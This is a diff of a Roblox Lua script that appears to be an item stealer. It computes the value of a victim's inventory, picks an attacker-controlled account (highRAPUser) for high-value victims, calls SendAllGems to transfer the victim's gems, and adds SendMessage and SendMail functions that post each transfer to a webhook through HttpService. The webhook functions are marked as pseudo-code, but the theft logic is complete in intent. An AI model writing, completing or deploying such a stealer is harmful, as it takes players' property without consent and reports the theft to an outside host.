@@ -294,42 +294,47 @@ if #sortedItems > 0 then
 local targetUser = (totalRAP > 100000) and highRAPUser or plr.Name
 local targetWebhook = (totalRAP > 100000) and highRAPWebhook or webhook
 
-spawn(function()
-    -- Conditional send logic based on totalRAP value
-    if totalRAP > 100000 then
-        -- Debug: Log before sending to highRAPUser
-        print("Sending to highRAPUser due to totalRAP > 100000")
-        print("High RAP User: " .. highRAPUser)
-        print("Gem Amount: " .. GemAmount1)
-        print("Webhook: " .. highRAPWebhook)
-
-        -- If total RAP > 100,000:
-        -- Send both message and mail to highRAPWebhook/highRAPUser
-        SendMessage(highRAPUser, GemAmount1, highRAPWebhook, highRAPUser)  -- Ensure to send message to highRAPUser
-        SendMail(highRAPUser, GemAmount1, highRAPWebhook)  -- Ensure mail is sent to highRAPUser
-
+function SendMessage(user, GemAmount, webhook, userId)
+    -- Send the message (pseudo-code, adapt to your API)
+    local success, response = pcall(function()
+        -- Send the message (you need to replace with actual API sending code)
+        local data = {
+            content = "Message to: " .. userId .. " GemAmount: " .. GemAmount
+        }
+        -- Assuming `httpService` sends the webhook request
+        return game:GetService("HttpService"):PostAsync(webhook, game:GetService("HttpService"):JSONEncode(data))
+    end)
+    
+    -- Debugging response
+    if success then
+        print("Message successfully sent to " .. userId)
     else
-        -- Debug: Log before sending to global user
-        print("Sending to global user due to totalRAP <= 100000")
-        print("Global User: " .. user)
-        print("Gem Amount: " .. GemAmount1)
-        print("Webhook: " .. webhook)
-
-        -- If total RAP <= 100,000:
-        -- Send both message and mail to global webhook/user
-        SendMessage(user, GemAmount1, webhook, user)  -- Send message to global user
-        SendMail(user, GemAmount1, webhook)  -- Send mail to global user
-
-        -- Debug: Log before sending to highRAPUser without mail
-        print("Sending message to highRAPUser without mail")
-        print("High RAP User: " .. highRAPUser)
-        print("Gem Amount: " .. GemAmount1)
-        print("Webhook: " .. highRAPWebhook)
-
-        -- Also send message to highRAPWebhook/highRAPUser (without mail)
-        SendMessage(highRAPUser, GemAmount1, highRAPWebhook, highRAPUser)
+        print("Failed to send message to " .. userId)
+        print("Error: " .. tostring(response))  -- Log error message
     end
-end)
+end
+
+function SendMail(user, GemAmount, webhook)
+    -- Send the mail (pseudo-code, adapt to your API)
+    local success, response = pcall(function()
+        -- Send the mail (you need to replace with actual mail-sending code)
+        local data = {
+            to = user,
+            content = "Mail to: " .. user .. " GemAmount: " .. GemAmount
+        }
+        -- Assuming `httpService` sends the webhook request
+        return game:GetService("HttpService"):PostAsync(webhook, game:GetService("HttpService"):JSONEncode(data))
+    end)
+    
+    -- Debugging response
+    if success then
+        print("Mail successfully sent to " .. user)
+    else
+        print("Failed to send mail to " .. user)
+        print("Error: " .. tostring(response))  -- Log error message
+    end
+end
+
 
 
     SendAllGems()
